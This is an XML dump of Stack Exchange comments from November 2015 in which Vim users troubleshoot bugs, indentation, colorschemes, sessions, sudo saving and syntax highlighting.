  <row Id="8578" PostId="5543" Score="1" Text="looks like a bug to me" CreationDate="2015-11-20T09:25:35.417" UserId="71" />
  <row Id="8580" PostId="5543" Score="0" Text="Hm, indeed, 's1' seems to substract one at the *next* line. I asked [vim_dev](https://groups.google.com/d/msg/vim_dev/WTie2-0NPbI/5afyYiseBwAJ) for clarification. I would say it is a bug." CreationDate="2015-11-20T09:41:02.337" UserId="71" />
  <row Id="8581" PostId="5543" Score="0" Text="Ah ok, you already reported it, I will not file an issue on Github then." CreationDate="2015-11-20T09:44:42.827" UserId="3282" />
  <row Id="8582" PostId="5546" Score="2" Text="can you git-bisect and find the offending patch?" CreationDate="2015-11-20T09:46:54.263" UserId="71" />
  <row Id="8583" PostId="5549" Score="0" Text="How do you indent your files (a tab character, 4 spaces...) ? How do you imagine the solution (a mapping used in normal mode for the whole file, in visual mode while a portion of the file is selected...) ?" CreationDate="2015-11-20T10:04:28.040" UserId="4939" />
  <row Id="8584" PostId="5549" Score="0" Text="@saginaw There are either only spaces or only tab characters (otherwise the problem might have no solution). I actually need to apply this to whole files, but I guess it'd be easily usable on visually selected portions as well. The algorithm looks simple: given the amount of whitespace at the beginning of each line,  stored in a vector `v`, say, subtract from `v` the minimum of `v` so that its new minimum is now zero." CreationDate="2015-11-20T11:06:43.993" UserId="2978" />
  <row Id="8585" PostId="5551" Score="0" Text="Thanks. Unfortunately, I think it removes one extra level and thus looses the information. I am sorry this script uses syntaxes I was even unaware of, so I can't read it and spot the mistake. I'll have a look at it after I delved into `vim`'s doc." CreationDate="2015-11-20T11:28:44.960" UserId="2978" />
  <row Id="8586" PostId="5551" Score="0" Text="Could you provide a sample text on which the code removes one extra level ? I've tested it on the sample text you gave in your first post and it seems to work, unless I misunderstood something ? Or maybe I have different settings ? My indentation settings are : `set expandtab`, `set tabstop=4`, `set shiftwidth=4`, `set softtabstop=4`. Also, I've edited the code so that you don't have to repeat the mapping in case there are more than one extra indentation level on the first line." CreationDate="2015-11-20T11:45:57.610" UserId="4939" />
  <row Id="8587" PostId="5551" Score="0" Text="I was missing the `tabstop` one ! It's working perfectly now. In order words, you nailed it. Cheers :)" CreationDate="2015-11-20T12:01:57.027" UserId="2978" />
  <row Id="8588" PostId="5551" Score="0" Text="I'm really glad it helped you ! I've edited the answer, if you can rely on the first character of the first line to detect whether the file uses spaces or tabs for indentation, then I think you can do it with only one function and one mapping which will cover both cases." CreationDate="2015-11-20T12:40:40.423" UserId="4939" />
  <row Id="8589" PostId="5554" Score="0" Text="Nice! This is definitely more elegant ;)" CreationDate="2015-11-20T16:16:47.893" UserId="2978" />
  <row Id="8590" PostId="5554" Score="0" Text="Or just `d]P` if you have selected the lines you want in visual mode." CreationDate="2015-11-20T16:32:55.260" UserId="5285" />
  <row Id="8591" PostId="5554" Score="0" Text="@Loovjo If you are in visual mode make sure you use `V` (Visual Line) so that the text is deleted line-wise. Alternatively you can use Tim Pope's [unimpaired.vim](https://github.com/tpope/vim-unimpaired) which changes `]p` and friends to always paste line-wise." CreationDate="2015-11-20T16:52:29.377" UserId="778" />
  <row Id="8592" PostId="5548" Score="0" Text="Thank you! This works nicely to do what I asked, but I now realize that it would also be nice to be able to update the window the buffer ist being show in. `autoread` doesn't seem to be able to do that, unfortunately." CreationDate="2015-11-20T18:02:46.397" UserId="5374" />
  <row Id="8593" PostId="5548" Score="0" Text="I'm really glad I could help you a little bit ! I'm sorry, I don't understand, what do you mean by updating the window ?  You want another mapping that would display the buffer in which you copy your words inside the current window ? Or modify the existing mapping that copy a word so that it also automatically switch to the other buffer ? I don't know if it can help but there's a command that can redraw the window : `:redraw!`" CreationDate="2015-11-20T18:15:54.520" UserId="4939" />
  <row Id="8594" PostId="5548" Score="0" Text="What I mean is that I have the main buffer in one vim window and the other one, where I'm appendind the words, open in another vim window, which is being displayed at the same time (a `:vsplit`). When I use the mapping you suggested, the file is updated but that change is not reflected on the buffer until I switch to its window and `:e`." CreationDate="2015-11-20T19:58:07.623" UserId="5374" />
  <row Id="8595" PostId="5548" Score="0" Text="Ok, I understand, I was not using a split window, so I didn't realise the display was not updated. I think you can force an update on all windows with the command `windo e`. I've edited the answer to add it in the mappings. I hope it will be enough to solve the problem." CreationDate="2015-11-20T20:23:05.383" UserId="4939" />
  <row Id="8597" PostId="343" Score="0" Text="Interesting related reading: http://usevim.com/2012/06/20/vim-binary-files/" CreationDate="2015-11-21T00:07:15.587" UserId="739" />
  <row Id="8598" PostId="5548" Score="1" Text="Thank you, this is great. I'll use that in conjunction with [this](http://vi.stackexchange.com/questions/4827/what-is-a-better-way-to-use-windo-without-changing-of-window) to prevent the focus to leave the main window. Thanks again!" CreationDate="2015-11-21T00:15:00.550" UserId="5374" />
  <row Id="8599" PostId="5546" Score="0" Text="@ChristianBrabandt: I try git bisect from patch 900 but the problem still occur. I don't remember the exactly patch before I updated to patch 922. The culprit can also be my plugins updated. I am trying to find what's the real culprit. Do you have the same issue with latest patch? I updated to 930 and the problem still occur." CreationDate="2015-11-21T03:35:02.193" UserId="1892" />
  <row Id="8600" PostId="5552" Score="0" Text="The behavior you describe works for strings, but not brackets, and there are good reasons. See [my answer on a related question](http://vi.stackexchange.com/a/33/64)." CreationDate="2015-11-21T05:48:35.287" UserId="64" />
  <row Id="8601" PostId="5562" Score="0" Text="Why don't you simply do all that as root, as intended?" CreationDate="2015-11-21T11:11:43.493" UserId="54" />
  <row Id="8602" PostId="5562" Score="0" Text="@romainl Im not sure I understand, do you mean `:! sudo vim -exec &quot;mksession&quot;` or something like that?" CreationDate="2015-11-21T11:14:51.690" UserId="4603" />
  <row Id="8603" PostId="5562" Score="0" Text="No. Edit system files as root." CreationDate="2015-11-21T11:56:24.247" UserId="54" />
  <row Id="8604" PostId="5562" Score="0" Text="you mean like in my answer below?" CreationDate="2015-11-21T11:58:02.027" UserId="4603" />
  <row Id="8605" PostId="5562" Score="0" Text="No, I mean editing those files as root, not as a regular user. That's how you are supposed to do it." CreationDate="2015-11-21T11:59:55.433" UserId="54" />
  <row Id="8606" PostId="5562" Score="0" Text="Oh you mean I should have just launched vim as root to begin with ? 4 times out of 5 I only want to look at those config files - so going in without root privileges is my safety mechanism to prevent me accidentally changing something." CreationDate="2015-11-21T12:11:46.070" UserId="4603" />
  <row Id="8607" PostId="5562" Score="2" Text="Editors are for *editing* files, if you only want to take a look, use a pager like `less`. As for &quot;sessions&quot;, take a look at `screen`, `tmux`or `detach`." CreationDate="2015-11-21T12:50:18.723" UserId="54" />
  <row Id="8608" PostId="5567" Score="0" Text="Your default colorscheme seems to be babymate256. When you say it doesn't work, which colorscheme is loaded instead ? Could you provide the content of a log file `vim --startuptime log` to see which file sets up the colorscheme ? You can access the name of your current colorscheme through the global variable `g:colors_name` and load the colorscheme manually with the following command : `execute &quot;colorscheme &quot; . g:colors_name`" CreationDate="2015-11-21T14:25:09.747" UserId="4939" />
  <row Id="8609" PostId="5567" Score="0" Text="[log](http://paste.debian.net/334635/)&#xA; Instead of babymate256, it has loaded the default one. Did you mean that?" CreationDate="2015-11-21T14:39:14.177" UserId="2354" />
  <row Id="8610" PostId="5567" Score="0" Text="Using a normal directory structure and normal file names would certainly help you." CreationDate="2015-11-21T14:42:31.167" UserId="54" />
  <row Id="8611" PostId="5567" Score="0" Text="@romainl what do you mean by &quot;normal directory structure&quot; and &quot;normal file names&quot;?" CreationDate="2015-11-21T14:44:13.650" UserId="2354" />
  <row Id="8612" PostId="5567" Score="0" Text="`~/.nvim/` and `~/.nvim/nvimrc` instead of `~/.config/nvim/` and `~/.config/nvim/init.vim`, for example. Also why both `~/.config` *and* `~/.dotfiles`? Your config is a total mess and your colorscheme issues are only the tip of the iceberg. I suggest you start again from scratch." CreationDate="2015-11-21T14:51:11.097" UserId="54" />
  <row Id="8613" PostId="5567" Score="0" Text="That are the offical directory/naming conventions for [neovim](https://neovim.io/doc/user/vim_diff.html#nvim-configuration). So, in this case, `~/.config/nvim` is just a symlink to `~/.dotfiles/nvim`. That is totally working and **not** the problem. But i have to admit, i don't know why some files are loaded from the sym link and some from `~/.dotfiles/nvim`.&#xA;**EDIT** And btw. i love the consistent directory structure(`/etc/nvim` vs `~/.config/nvim` of neovim :D" CreationDate="2015-11-21T15:02:30.647" UserId="2354" />
  <row Id="8614" PostId="5567" Score="1" Text="@toogley Maybe I missed it, but I can't find the name of your default colorscheme in your log (it should be in a `colors` folder and the only one I see is `babymate256`). What's the name of your default colorscheme when you type `:colo` ? Another thing you could do to start investigating : type `:hi`, it will display all the highlight groups currently set. Find the name of one whose colors are not the ones you want (let's say for example `StatusLine`). Then type `:verb hi StatusLine` to discover which file last set the status line highlight group." CreationDate="2015-11-21T15:13:06.547" UserId="4939" />
  <row Id="8615" PostId="5570" Score="0" Text="There is already a TOC at the top of every help file." CreationDate="2015-11-22T12:16:55.927" UserId="54" />
  <row Id="8616" PostId="5562" Score="0" Text="You should run Vim as user. Store you sessions in your own directory. If you need to edit some root-owned files use `sudo` hacks. Something like this:&#xA;`cmap w!! sudo tee % &gt; /dev/null %`" CreationDate="2015-11-22T12:27:24.647" UserId="1145" />
  <row Id="8617" PostId="5572" Score="0" Text="thanks, I should check the documentation first next time." CreationDate="2015-11-22T13:08:06.917" UserId="4562" />
  <row Id="8618" PostId="5573" Score="0" Text="Sorry, Christian Brabandt just beat you to it :/" CreationDate="2015-11-22T13:10:36.967" UserId="4562" />
  <row Id="8619" PostId="5573" Score="1" Text="No competition, no problem." CreationDate="2015-11-22T13:15:00.103" UserId="54" />
  <row Id="8620" PostId="5570" Score="0" Text="That's great, but I want it folded, and folded by default. That's the point of my question." CreationDate="2015-11-22T14:18:54.160" UserId="5089" />
  <row Id="8621" PostId="5570" Score="0" Text="Using tags and jumps accomplishes the same thing, in the current help format." CreationDate="2015-11-22T16:22:48.930" UserId="1800" />
  <row Id="8622" PostId="5570" Score="0" Text="@VanLaser: Hm, I'm new to tags. How would that look? The folding part specifically." CreationDate="2015-11-22T16:45:11.613" UserId="5089" />
  <row Id="8623" PostId="5575" Score="0" Text="I couldn't find a relevant tag for the `sudo` part. `sudo` is not a tag, nor `root`, nor `privileged`." CreationDate="2015-11-22T17:04:01.733" UserId="5399" />
  <row Id="8624" PostId="5578" Score="1" Text="cool, thanks. I see from `:h ctrl-w_j` this is pretty much a command for exactly that! i.e. `Move the current window to be at the very bottom, using the full width of the screen.  This works like closing the current window and then creating another one with &quot;:botright split&quot;,  except that the current window contents is used for the new window.`" CreationDate="2015-11-22T18:00:15.917" UserId="4603" />
  <row Id="8625" PostId="5557" Score="0" Text="Are you sure you don't have [use errorwindow](http://vimhelp.appspot.com/pi_netrw.txt.html#g%3Anetrw_use_errorwindow) set?  I am pretty sure I found my answer." CreationDate="2015-11-23T02:30:36.423" UserId="3241" />
  <row Id="8626" PostId="3174" Score="0" Text="@ChristianBrabandt, same here. Yes it is the patch without doubt. Do you know how to resolve this problem?" CreationDate="2015-11-23T07:32:52.563" UserId="4646" />
  <row Id="8627" PostId="3174" Score="1" Text="@Reman try setting foldmethod=manual" CreationDate="2015-11-24T13:11:31.503" UserId="71" />
  <row Id="8628" PostId="5587" Score="0" Text="Thanks, that's exactly what I was looking for. I don't understand half the commands you used tho :/" CreationDate="2015-11-24T14:07:11.103" UserId="4562" />
  <row Id="8629" PostId="5587" Score="2" Text="I'm sorry for not explaining the code, I'm going to edit the post to explain it so that you can tweak it to your liking if you want. It's just going to take me a moment." CreationDate="2015-11-24T14:13:02.500" UserId="4939" />
  <row Id="8630" PostId="5587" Score="0" Text="Thank you, take your time! I'm always interested in knowing exactly the tools I am using." CreationDate="2015-11-24T14:14:33.593" UserId="4562" />
  <row Id="8631" PostId="5588" Score="0" Text="Maybe the &quot;missing&quot; 2nd line is still appended to the 1st, but not visible, at the end (after) the status line. The blank line can suggest a stray `\r` (`&lt;CR&gt;`) left at the end of the message. What happens if you change the `'\\n'` with `'\\r'` (or even `'\\r\\n'`, try both) in your `split()` function?" CreationDate="2015-11-24T16:14:11.303" UserId="1800" />
  <row Id="8632" PostId="5589" Score="0" Text="And if the file is saved/not new, any difference?" CreationDate="2015-11-24T16:20:48.477" UserId="5419" />
  <row Id="8633" PostId="5589" Score="0" Text="It is the same behavior." CreationDate="2015-11-24T16:24:09.103" UserId="5010" />
  <row Id="8634" PostId="5587" Score="0" Text="I've tried to simplify the code and did my best to explain it in detail. I hope after reading it, the code will make more sense." CreationDate="2015-11-24T16:42:02.017" UserId="4939" />
  <row Id="8635" PostId="5589" Score="0" Text="Then you could remove that information from the text in order to make the problem simpler." CreationDate="2015-11-24T17:31:03.077" UserId="5419" />
  <row Id="8636" PostId="5589" Score="0" Text="@GabrielPetrovay, thank you for the feedback! `:-)` I updated the question." CreationDate="2015-11-24T17:34:13.670" UserId="5010" />
  <row Id="8637" PostId="5589" Score="0" Text="what is your 'fo' option and 'formatexpr' and formatprg option?" CreationDate="2015-11-24T18:05:52.147" UserId="71" />
  <row Id="8638" PostId="5590" Score="0" Text="better use my [SudoWrite](http://github.com/chrisbra/SudoEdit.vim/) plugin, which works on Windows and supports undofiles" CreationDate="2015-11-24T18:08:10.873" UserId="71" />
  <row Id="8639" PostId="5590" Score="0" Text="Windows has something equivalent to `sudo` ?" CreationDate="2015-11-24T18:09:25.053" UserId="2303" />
  <row Id="8640" PostId="5590" Score="0" Text="Why shouldn't it have?" CreationDate="2015-11-24T18:10:02.407" UserId="71" />
  <row Id="8641" PostId="5590" Score="0" Text="Yeah I spose any `admin` user is similar to `root`. Cool." CreationDate="2015-11-24T18:11:14.420" UserId="2303" />
  <row Id="8642" PostId="5589" Score="0" Text="@ChristianBrabandt, I have updated the question with the details you requested." CreationDate="2015-11-24T18:14:20.533" UserId="5010" />
  <row Id="8643" PostId="5588" Score="0" Text="@VanLaser Thanks for the suggestion. It did not work. It might be something far more complicated. The same three functions that are supposed to deliver their three messages just work fine when they are on their own. However, when they are where they are originally (inside a while loop, buried deep inside another function) messages start to be dropped. However, even simple commands such as `echom 'See this?'` will get dropped at that very same spot. So it must be the while loop?" CreationDate="2015-11-24T18:22:48.263" UserId="5328" />
  <row Id="8644" PostId="5513" Score="0" Text="@d3day, you know about `n` and `N`, right?  Because if you type `/\.&lt;CR&gt;` *once*, you can use `n` any number of times after that.  (You should also know the `;` and `,` commands if you don't already.)" CreationDate="2015-11-24T18:26:16.363" UserId="4676" />
  <row Id="8645" PostId="5562" Score="0" Text="I prefer to edit files as my own user, as that will load all my plugins. Also this way it is simpler for me when I work on servers where i don't have root access." CreationDate="2015-11-24T18:39:26.230" UserId="2303" />
  <row Id="8646" PostId="5587" Score="0" Text="I never hoped to get such a complete answer. I read it but I'll need to go over it carefully. +2 if I could!" CreationDate="2015-11-24T19:33:40.560" UserId="4562" />
  <row Id="8647" PostId="4096" Score="0" Text="g:netrw_dirhistmax is used to specify how much history you want netrw to keep about (see :help netrw-u, for example).  It has nothing to do with however you changed a netrw buffer." CreationDate="2015-11-24T19:34:42.663" UserId="2377" />
  <row Id="8648" PostId="3696" Score="0" Text="See if  :help netrw-debug  will help you with its addtional information on your problem." CreationDate="2015-11-24T19:39:22.570" UserId="2377" />
  <row Id="8649" PostId="5587" Score="0" Text="Thank you for accepting my answer, but Peter Rincker's answer is better. I think you should accept it. My solution works only for the first word beginning with a specific letter. His solution is shorter and can be repeated. Sorry for the inconvenience." CreationDate="2015-11-24T21:21:00.837" UserId="4939" />
  <row Id="8650" PostId="5595" Score="5" Text="You can do `curl http://www.example.com/files/images/img{01,49}.jpg` in bash to accomplish your work." CreationDate="2015-11-25T06:13:35.013" UserId="54" />
  <row Id="8651" PostId="5595" Score="0" Text="@romainl You **forced** me to sign up to reply to your comment. Now let me tell you that I'm using Windows. and `{` &amp; `}` are bash expansion. So no luck on *Powershell*, at least." CreationDate="2015-11-25T06:33:10.350" UserId="5425" />
  <row Id="8652" PostId="5543" Score="0" Text="it's a [feature](https://groups.google.com/d/msg/vim_dev/WTie2-0NPbI/rxJURAWfAAAJ). documentation wil be updated" CreationDate="2015-11-25T07:51:17.487" UserId="71" />
  <row Id="8653" PostId="5595" Score="0" Text="Well, you will need to log in to accept my answer anyway so…" CreationDate="2015-11-25T10:18:59.083" UserId="54" />
  <row Id="8654" PostId="5587" Score="0" Text="Yes, his answer is indeed more compact and uses Vim's intrinsic functions. Your answer did help me out tho! Thanks" CreationDate="2015-11-25T13:38:46.813" UserId="4562" />
  <row Id="8655" PostId="5543" Score="0" Text="Ok, thanks a lot!" CreationDate="2015-11-25T15:17:33.460" UserId="3282" />
  <row Id="8656" PostId="5601" Score="3" Text="check `:windo :set cursorbind? scrollbind?`" CreationDate="2015-11-25T15:38:19.710" UserId="71" />
  <row Id="8657" PostId="5601" Score="0" Text="`cursorbind` and `scrollbind` are both off.  `:windo` is a command that, to my knowledge, I am not using." CreationDate="2015-11-25T15:48:01.960" UserId="2399" />
  <row Id="8658" PostId="5601" Score="3" Text="I meant to type that command litteraly, e.g. including the :windo so you can see, if it is set in any window." CreationDate="2015-11-25T15:55:45.507" UserId="71" />
  <row Id="8659" PostId="5601" Score="2" Text="Cool.  It turns out that `cursorbind` *was* set.  Thanks." CreationDate="2015-11-25T17:56:32.890" UserId="2399" />
  <row Id="8660" PostId="5595" Score="0" Text="I got a problem with my accounts: http://meta.stackexchange.com/q/269958/181377" CreationDate="2015-11-25T18:38:12.967" UserId="5425" />
  <row Id="8661" PostId="521" Score="1" Text="I couldn't agree more, I found in Gnome-terminal `:set mouse=n` is enough, but to enable when inside tmux `:set ttymouse=xterm2` is needed." CreationDate="2015-11-26T03:17:11.230" UserId="4603" />
  <row Id="8662" PostId="5605" Score="0" Text="Have you consider asking about on the plugin's [issue tracker](https://github.com/inside/vim-search-pulse/issues)?" CreationDate="2015-11-26T08:47:02.037" UserId="2313" />
  <row Id="8663" PostId="5608" Score="0" Text="I actually don't find VimL that cumbersome. Of course, I agree it lacks cool features and functionality of higher level languages like python, but after working with it for some time, I find VimL quite pleasant to work with. I think the reputation for VimL is worse than it needs be." CreationDate="2015-11-26T10:21:05.720" UserId="21" />
  <row Id="8664" PostId="5606" Score="2" Text="Note that many people use vimscript to configure (very thoroughly) their Vim, without creating or distributing any plugins." CreationDate="2015-11-26T11:23:10.963" UserId="1800" />
  <row Id="8665" PostId="5608" Score="0" Text="Well. I must admit that many progresses have been made since vim5.x (when I started using it). But there still are corner cases where we have to do complex things. See for instance `map()` that expects strings or (the unrelated) `:map`. I often have to play with/around string evaluation to come to my ends like generating mappings or processing list of function calls, ..." CreationDate="2015-11-26T12:34:28.090" UserId="626" />
  <row Id="8666" PostId="5611" Score="1" Text="You should give more details, such as any plugins involved, and perhaps include a example of a setting you changed, then how you sourced and verified that it is unchanged." CreationDate="2015-11-26T15:22:19.927" UserId="1405" />
  <row Id="8668" PostId="5611" Score="0" Text="@mMontu Thanks for your interest; i've updated the question. I sourced the vimrc file using :source. Are you implying that some settings can be overriden and some can't?" CreationDate="2015-11-26T16:01:34.873" UserId="859" />
  <row Id="8669" PostId="5612" Score="1" Text="I'll post the answer later on. Let's see if someone else builds a better solution in the meantime." CreationDate="2015-11-26T18:11:33.760" UserId="205" />
  <row Id="8670" PostId="5596" Score="0" Text="Your answer was cool too, but I chose Christian's because it involves fewer keystrokes. :)" CreationDate="2015-11-26T19:18:56.770" UserId="5425" />
  <row Id="8672" PostId="5612" Score="1" Text="I have not much experience with `--remote` arguments, but you should get something to work, if in your function you check for the argument `-q` and then use `--remote-send &quot;:cexpr $1&lt;cr&gt;&quot;` or something like this. That should work, but as I said, I don't know for sure." CreationDate="2015-11-26T22:22:39.503" UserId="71" />
  <row Id="8673" PostId="5546" Score="0" Text="@ChristianBrabandt: It seem that problem came from one of my plugins. If I clean up all the plugins, then left only `au filetype * set bg=dark` in `.vimrc`, it worked fine. Any suggestion to trace this problem?" CreationDate="2015-11-27T04:11:26.643" UserId="1892" />
  <row Id="8674" PostId="5608" Score="0" Text="Writing vim plugins in another language doesn't free you from learning VimL anyhow, because the bindings to python/ruby/etc. are pretty limited and you inevitably end up `exec`ing snippets of VimL anyway. It lets you write your core logic in a language that you might be able to work a lot more efficiently in, but you still pretty much need to learn VimL." CreationDate="2015-11-27T04:51:43.293" UserId="2658" />
  <row Id="8677" PostId="5546" Score="0" Text="Depending on the number of plugins, this can be a tedious task. You would have to disable the plugins one by one and check. I don't know a better way." CreationDate="2015-11-27T08:58:08.093" UserId="71" />
  <row Id="8678" PostId="5616" Score="0" Text="Ok, that works.  But it's still me manually changing one thing that my vimrc file contains; it can contain other things: autocommands, for example.  I was hoping there'd be some way of saying &quot;forgot the settings as they were at the point the session was created and use these new settings; burn these into the session&quot;.  Perhaps this is not possible.  I'm gonig to mark your question as correct because it seems to describe the only sensible option." CreationDate="2015-11-27T09:50:45.013" UserId="859" />
  <row Id="8679" PostId="5620" Score="0" Text="It's too much for this trivial problem. :P By the way thanks for the answer." CreationDate="2015-11-27T11:41:59.063" UserId="5425" />
  <row Id="8680" PostId="5622" Score="0" Text="seems related: https://vi.stackexchange.com/questions/3359/how-to-fix-status-bar-symbols-in-airline-plugin?rq=1" CreationDate="2015-11-27T14:41:09.583" UserId="5449" />
  <row Id="8681" PostId="5618" Score="0" Text="Nice explanation ! The only thing hard to understand for me was the special parameter '$*'. There seems to be a sort of chain : original shell &gt; vim &gt; system() function &gt; another shell, and they all inherit the environment of the first one otherwise the last shell wouldn't be able to expand '$*' correctly. Thanks for your thorough explanation." CreationDate="2015-11-27T16:03:51.713" UserId="4939" />
  <row Id="8682" PostId="5616" Score="0" Text="@Alex I've updated the answer, maybe it fulfills your needs" CreationDate="2015-11-27T17:15:58.603" UserId="1405" />
  <row Id="8683" PostId="5622" Score="0" Text="Don't set `t_Co`. Instead, set `TERM=xterm-256color` from the shell before starting Vim." CreationDate="2015-11-27T18:01:20.017" UserId="205" />
  <row Id="8684" PostId="5622" Score="0" Text="@muru Could you please elaborate the the harm of setting `t_Co`?" CreationDate="2015-11-27T18:02:25.217" UserId="5449" />
  <row Id="8685" PostId="5622" Score="1" Text="See: http://vi.stackexchange.com/a/1891/205" CreationDate="2015-11-27T18:02:57.073" UserId="205" />
  <row Id="8686" PostId="5623" Score="0" Text="I'd guess the colorscheme is one of the solarized themes." CreationDate="2015-11-27T18:04:30.367" UserId="205" />
  <row Id="8687" PostId="5626" Score="0" Text="nice breakdown! whenever I restore a session I lose the NERDTree window - which is not important but out of interest - do you know if its possible to restore NERDTree using the `sessionoptions` you have described?" CreationDate="2015-11-27T18:09:10.320" UserId="4603" />
  <row Id="8688" PostId="5622" Score="1" Text="Also: http://i.stack.imgur.com/hkWc5.png for a comparison. The Vim on the left was started with `TERM=xterm-256color`, on the right, with `TERM=xterm` and `:set t_Co=256`. The one on the left looks like it has a grey background, but that's a screenshot artifact - it's actually transparent, and I could see my wallpaper and the browser window behind it. With `t_Co=256`, that understanding of the terminal is lost and the background is solid black. Better screenshot: http://i.stack.imgur.com/kMf7c.png" CreationDate="2015-11-27T18:09:33.737" UserId="205" />
  <row Id="8689" PostId="5622" Score="0" Text="@muru This useful information that I think that this could be a nice answer to a follow-up question; I just haven't thought about a catchy name besides &quot;Should I use `t_Co` to set colors?&quot;" CreationDate="2015-11-27T18:12:41.403" UserId="5449" />
  <row Id="8690" PostId="5623" Score="0" Text="how did you get the git branch to appear?" CreationDate="2015-11-27T18:47:05.070" UserId="4603" />
  <row Id="8691" PostId="5623" Score="0" Text="@user4668401 that could be the fugitive plugin" CreationDate="2015-11-27T18:57:13.237" UserId="5449" />
  <row Id="8692" PostId="5627" Score="0" Text="Thank you really much!" CreationDate="2015-11-27T18:59:04.127" UserId="5454" />
  <row Id="8695" PostId="5626" Score="0" Text="I don't know if there is a way of restoring a Nerdtree window since I don't use that plugin, but it might be because of something special that it does with its buffer s" CreationDate="2015-11-27T20:18:06.393" UserId="865" />
  <row Id="8696" PostId="305" Score="0" Text="I am interested to do this in neovim" CreationDate="2015-11-27T22:36:36.430" UserId="5422" />
  <row Id="8697" PostId="5633" Score="0" Text="I assume that there would also be a key to enter insert mode above current line, isn't there?" CreationDate="2015-11-27T23:09:12.650" UserId="5449" />
  <row Id="8698" PostId="5633" Score="2" Text="That would be `O`.  (shift-o)" CreationDate="2015-11-27T23:09:29.617" UserId="865" />
  <row Id="8700" PostId="5633" Score="0" Text="@Alex Follow up question cause you blew my mind! http://vi.stackexchange.com/questions/5634/what-options-are-there-to-enter-insert-mode" CreationDate="2015-11-27T23:16:38.913" UserId="5449" />
  <row Id="8701" PostId="5633" Score="1" Text="@Alex If you want to expand your answer, please do so via edit. Comments are for meta-purpose (clarification, random side questions) and should not hide valuable information." CreationDate="2015-11-27T23:18:17.077" UserId="5449" />
  <row Id="8702" PostId="5634" Score="0" Text="`:h inserting` - also `:h replacing`" CreationDate="2015-11-27T23:20:48.930" UserId="1800" />
  <row Id="8703" PostId="5634" Score="0" Text="@VanLaser You can add that as an answer ^^" CreationDate="2015-11-27T23:21:51.457" UserId="5449" />
  <row Id="8704" PostId="5634" Score="0" Text="thanks - too easy ;) It's in the help!" CreationDate="2015-11-27T23:22:11.083" UserId="1800" />
  <row Id="8710" PostId="5633" Score="0" Text="Good point! I've moved my expansion from the comment to the answer." CreationDate="2015-11-28T02:06:21.373" UserId="1402" />
  <row Id="8711" PostId="5633" Score="1" Text="The first thing you say about `gg` is true for `G` as well; `5G` will jump to line 5, just as `5gg` does.  It's interesting that `gg` defaults to `1gg` (= `1G`) while `G` defaults to the last line." CreationDate="2015-11-28T07:23:02.290" UserId="5458" />
  <row Id="8712" PostId="5632" Score="1" Text="What does the `:set t_Co` command display? It should tell you how many colors vim thinks to be available. This may be wrong; you may try to force 256 colors with `:set t_Co=256`" CreationDate="2015-11-28T10:00:44.400" UserId="5139" />
  <row Id="8713" PostId="5638" Score="1" Text="Not an answer, but maybe a starting point: opening a `(` starts a `texParen` syntax region: see section starting at `&quot; Try to flag {} and () mismatches:` in [tex.vim](http://ftp.vim.org/vim/runtime/syntax/tex.vim). You could probably apply a fix similar to [this](http://vim.wikia.com/wiki/Remove_annoyance_with_syntax_highlighting_when_starting_a_string) one." CreationDate="2015-11-28T17:57:12.983" UserId="1800" />
  <row Id="8714" PostId="5638" Score="0" Text="This seems like a good lead. I tried adding `%stopzone` to the end conditions of texParen, but that doesn't seem to work." CreationDate="2015-11-28T19:54:49.620" UserId="5459" />
  <row Id="8715" PostId="5646" Score="0" Text="Thanks for the workaround. I have defined `\newcommand{\openParen}{(}` and `\newcommand{\closeParen}{)}`, and use these where the highlighting breaks." CreationDate="2015-11-28T20:03:59.297" UserId="5459" />
  <row Id="8716" PostId="5646" Score="0" Text="In my real use case, the parens _are_ actually matched. But there are a lot of intervening formatting macros that seem to stump the syntax highlighter. Rather than try to fix this, I figured it would be easier to just reset highlighting after the broken point. (Waiting a bit longer before accepting in case a better solution comes up.)" CreationDate="2015-11-28T20:06:44.600" UserId="5459" />
  <row Id="8717" PostId="5638" Score="0" Text="It works if, in the stock `tex.vim`,  `oneline` is added at the end of each of the two `syn region texParen ... ` lines." CreationDate="2015-11-29T00:17:39.467" UserId="1800" />
  <row Id="8718" PostId="5638" Score="0" Text="What is the drawback of adding `oneline`? You can also change this locally by doing a `syn clear texParen` in `~/.vim/after/syntax/tex.vim` and then copying and modifying the corresponding lines from the stock `tex.vim`. I tried this and it seems to work great for my use case, and it also seems to still support paren matching over multiple lines." CreationDate="2015-11-29T05:14:52.383" UserId="5459" />
  <row Id="8719" PostId="5638" Score="0" Text="What kind of support? Normally you just lost the ability to see if you have unmatched parens between multiple lines." CreationDate="2015-11-29T16:18:20.777" UserId="1800" />
  <row Id="8720" PostId="5650" Score="0" Text="Brilliant! That did it for me. For anyone interested, here's what my mapping looks like now: ``nnoremap &lt;Leader&gt;ss :set columns=95&lt;CR&gt;:sleep 5m&lt;CR&gt;&lt;C-l&gt;&#xA;``" CreationDate="2015-11-29T16:18:44.287" UserId="2593" />
  <row Id="8721" PostId="5632" Score="0" Text="Hey! Thanks for your help, but I just think I got a wrong color theme. I have no idea, where the right one is, but I just choose another one I like even more. If anyone knows the name of the theme he used in the video I'm happy to know it though." CreationDate="2015-11-29T19:48:49.663" UserId="5454" />
  <row Id="8722" PostId="5657" Score="0" Text="I am working on a fully functional example that will reproduce the issue. I will share that as soon as it works. However, I now know that in cases where `SendToFile()` is used consecutive, the following `SendToStatus()` will be dropped and will be only visible in the `:message` stream." CreationDate="2015-11-29T19:59:47.923" UserId="5328" />
  <row Id="8723" PostId="5660" Score="3" Text="`d/ba/e&lt;enter&gt;` - see `:h search-offset`. Why? Because `/` is an exclusive motion." CreationDate="2015-11-29T20:43:22.800" UserId="1800" />
  <row Id="8724" PostId="5660" Score="0" Text="Thanks @VanLaser...exactly what I was looking for" CreationDate="2015-11-29T20:45:03.373" UserId="2312" />
  <row Id="8725" PostId="5652" Score="0" Text="Yea, I should've clarified that part of the question; if the file is executable, doing `:! %` works" CreationDate="2015-11-29T20:45:21.710" UserId="5465" />
  <row Id="8726" PostId="5660" Score="0" Text="You're welcome! :)" CreationDate="2015-11-29T20:45:39.103" UserId="1800" />
  <row Id="8727" PostId="5662" Score="0" Text="how does this differ from using /e (as shown in @VanLaser's answer. Both seem to work" CreationDate="2015-11-29T20:51:56.387" UserId="2312" />
  <row Id="8728" PostId="5662" Score="1" Text="It differs in that this is using a trick of vim's regex system, whereas VanLaser's is using a feature of vim's search capability." CreationDate="2015-11-29T20:54:29.610" UserId="865" />
  <row Id="8733" PostId="5666" Score="1" Text="I think this is a duplicate of http://vi.stackexchange.com/questions/3968/is-there-a-way-to-and-events-in-the-autocmd." CreationDate="2015-11-30T22:33:00.687" UserId="2055" />
